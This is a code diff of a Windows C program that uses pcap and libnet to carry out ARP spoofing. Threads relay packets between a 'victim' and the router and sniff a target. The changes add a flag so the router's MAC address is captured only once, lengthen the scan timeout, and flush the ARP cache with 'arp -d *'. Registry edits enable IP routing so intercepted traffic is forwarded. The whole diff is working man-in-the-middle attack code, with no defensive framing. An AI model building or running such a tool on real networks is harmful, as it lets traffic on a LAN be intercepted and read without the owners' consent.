@@ -19,7 +19,7 @@ int main() {
 	struct libnet_arp_hdr *ah;
 	const u_char *pkt_data;
 	u_char data[ARP_HEADER_LEN] = { 0, };
-	int res, i, j = 0, number = 0, cnt = 0;
+	int res, i, j = 0, number = 0, cnt = 0, chk = 0;
 	char buf[32] = { 0, }, buf2[32] = { 0, }, errbuf[PCAP_ERRBUF_SIZE];
 	u_int threadID[5];
 	HANDLE scan, relay_vic_request, relay_vic_reply, relay_rou_request, relay_rou_reply, tar_sniffing;
@@ -75,11 +75,11 @@ int main() {
 	relay_rou_request = (HANDLE)_beginthreadex(NULL, 0, sending_rou_request, 0, 0, &threadID[3]);
 	relay_rou_reply = (HANDLE)_beginthreadex(NULL, 0, sending_rou_reply, 0, 0, &threadID[4]);
 
-	if (scan == 0 || relay_vic_reply == 0 ||relay_rou_request == 0 || relay_rou_reply == 0) {
+	if (scan == 0 || relay_vic_reply == 0 || relay_rou_request == 0 || relay_rou_reply == 0) {
 		printf("_beginthreadex() error");
 		return -1;
 	}
-
+	system("arp -d *");
 	while ((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0) {
 		if (res == 0) continue;
 		if (header->len != header->caplen) {
@@ -87,7 +87,7 @@ int main() {
 			exit(1);
 		}
 
-		if (count_time() > 20) {
+		if (count_time() > 60) {
 			setBroadcastFlag(TRUE, 0);
 			break;
 		}
@@ -100,7 +100,7 @@ int main() {
 			}
 
 			if (!strcmp(inet_ntop(AF_INET, &info->Router_Ip, buf, sizeof(buf)), inet_ntop(AF_INET, &ah->ar_spa, buf2, sizeof(buf2)))) {
-				if (!strncmp(info->Router_Mac, "", ETHER_ADDR_LEN)) {
+				if (!strncmp(info->Router_Mac, "", ETHER_ADDR_LEN) && chk == 0) {
 					printf("\tRouter MAC : \t");
 					for (i = 0; i < ETHER_ADDR_LEN; i++) {
 						*(info->Router_Mac + i) = *(ah->ar_sha + i);
@@ -108,9 +108,10 @@ int main() {
 						else printf("%02X-", *(info->Router_Mac + i));
 					}
 					printf("\n------------------------------------------------------------------------------------------------------------------------------------\n");
+					chk++;
 				}
 			}
-			if (ARPOP_REPLY == ntohs(ah->ar_op)) {
+			if (ARPOP_REPLY == ntohs(ah->ar_op) && chk == 1) {
 				if (broadcast_reply(ah)) {
 					cnt++;
 				}
@@ -120,8 +121,10 @@ int main() {
 	
 	WaitForSingleObject(scan, INFINITE);
 	CloseHandle(scan);
+	
 	system("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /t REG_DWORD /v IPEnableRouter /d 1 /f > NUL");
 	system("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess /t REG_DWORD /v Start /d 2 /f > NUL");
+
 	if (cnt == 0) printf("Not Found Target\n");
 	else {
 		setpcapData_relay(fp, *info);
